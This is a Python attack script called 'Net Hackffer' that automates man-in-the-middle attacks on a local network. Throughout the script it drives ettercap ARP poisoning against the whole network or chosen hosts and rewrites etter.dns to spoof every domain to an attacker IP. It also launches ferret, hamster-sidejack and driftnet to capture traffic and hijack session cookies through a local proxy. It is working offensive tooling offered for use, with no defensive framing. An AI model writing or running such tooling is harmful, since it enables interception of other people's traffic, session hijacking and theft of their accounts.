#!/bin/python3

import os
import time
import os.path
import colorama 
from colorama import Fore, Back , Style
os.system("clear")
#lol = "lolcat"
os.system(f"figlet -c Net Hackffer | lolcat --speed=50 -a --freq=20 -t -p && figlet -f digital -c By Hamza Mourid | lolcat")

def sniff(x):
    time.sleep(3)
    print(Fore.RED +Style.BRIGHT+ "starting attack ..")
    time.sleep(3)
    proxy = "http://127.0.0.1:1234"
    os.system(f"""xterm -bg black -fg green +j -geometry +0+0 -T SNIFFING -e sudo ferret -i {interface} & xterm -bg black -fg red -geometry -0+0 -T COOKIES.SNIFFING -e hamster-sidejack & sudo driftnet -i {interface} & echo "OPEN THIS LINK IN YOUR FIREFOX BROWSER >> {proxy}" """)

def dns(x):
    
    print("start spoofing attack ..")
    time.sleep(3)
    os.system(f"xterm -bg black -fg yellow -geometry +0-0 +j -T SPOOFING DNS -e sudo ettercap -T -q -M arp:remote -P dns_spoof -i {interface} /// & sleep 5 && {sniff(1)}")   

def discover(x):
    print(Style.BRIGHT+"""START DISCOVRING TARGETS ..
        
        """)
    time.sleep(2)
    print("""
            PRESS ctrl+c TO STOP
           """)
    os.system(f"sudo netdiscover -i {interface} -P -r {range_}")
    print("")
    print(Fore.BLACK+Style.BRIGHT+"ENTER THE TARGETS IP ADDRESS (split with [ / ])")
 
print(Fore.RED+Style.BRIGHT+"""

   AFTER RUNNING THIS PROGRAM YOU NEED TO SETUP YOU FIREFOX PROXY WITH
                         {127.0.0.1:1234}

      """)
time.sleep(5)
print(Fore.MAGENTA+Back.GREEN+Style.BRIGHT+"Ifaces :")
print("-------")
os.system("ifconfig -s | cut -c1-9 | grep -v Iface")
time.sleep(2)
print(Fore.BLUE+Back.BLACK+Style.BRIGHT+"TYPE THE IFACE YOU WANNA WORK WITH : ")

interface = str(input(""))
os.system("clear")
time.sleep(2)
print(Fore.RED+"""


            CHOICE YOUR ATTACK

""")
print(Fore.YELLOW+Style.BRIGHT+"[1]:MAN IN THE MIDDLE ATTACK")
print(Fore.YELLOW+Style.BRIGHT+"[2]:MAN IN THE MIDDLE WITH DNS SPOOFING")
print("""

""")
choice = str(input("choice :   "))
os.system("clear")
#arp_spoofing

if choice == "1":
    print("")
    print(Fore.MAGENTA+Style.BRIGHT+"[1]:ATTACK THE FULL NETWORK")
    print(Fore.MAGENTA+Style.BRIGHT+"[2]:ATTACK A SPECIFIC TARGETS")
    print("")
    choice_= str(input("choice : "))
    os.system("clear")
    if choice_ == "1":
        os.system(f"xterm -bg black -fg white -geometry +0-0 +j -e sudo ettercap -T -q -M arp:remote {interface} /// & {sniff(1)}")
       
        
    elif choice_ == "2":
        print(Fore.RESET+Style.BRIGHT+"ENTER A RNAGE LIKE >> 192.168.0.0/24")
        print("")
        range_=str(input("RANGE: "))
        os.system("clear")
        discover(2)
        add =input("IP ADD ==> ")
        os.system(f"xterm -bg black -fg white -geometry +0-0 +j -e sudo ettercap -T -q -M arp:remote {interface} /{add}/// & sleep 5 && {sniff(1)}")
#dns_spoofing
        
elif choice == "2":
    print("")
    print(Style.BRIGHT+Back.CYAN+"[1]:SPOOF ALL THE NETWORK")
    print(Style.BRIGHT+Back.CYAN+"[2]:SPOOF SPECIFIC TARGETS")
    print("")
    choice__= str(input("choice: "))
    os.system("clear")
    if choice__=="1":
        siteadd = str(input("SITE ADDRESS IP: "))
        
       
        
        with open("/etc/ettercap/etter.dns","r") as f:
            for line in f:
                pass
                
        same = "*.*.*"        
        if same in line:
            os.system(f"""sudo sed -i "$ d" /etc/ettercap/etter.dns >> /etc/ettercap/etter.dns && echo '*.*.*   A {siteadd} 9999' >> /etc/ettercap/etter.dns""")
            dns(1)
        else:
            os.system(f"""sudo echo '*.*.*   A {siteadd} 9999' >> /etc/ettercap/etter.dns """)       
            dns(1)    
            
    elif choice__=="2":
        print(Fore.BLACK+Style.BRIGHT+"ENTER A RNAGE LIKE >> 192.168.0.0/24")
        print("")
        range_=str(input("RANGE: "))
        os.system("clear")
        discover(1)
        print("")
        addr =input("IP ADD : ")
        os.system("clear")
        time.sleep(3)
        os.system(f"xterm -bg black -fg white +j -geometry +0-0 -e sudo ettercap -T -q -M arp:remote -P dns_spoof  {interface} /{addr}/// & sleep 5 && {sniff(1)}")
else:
    quit()        
















    

    


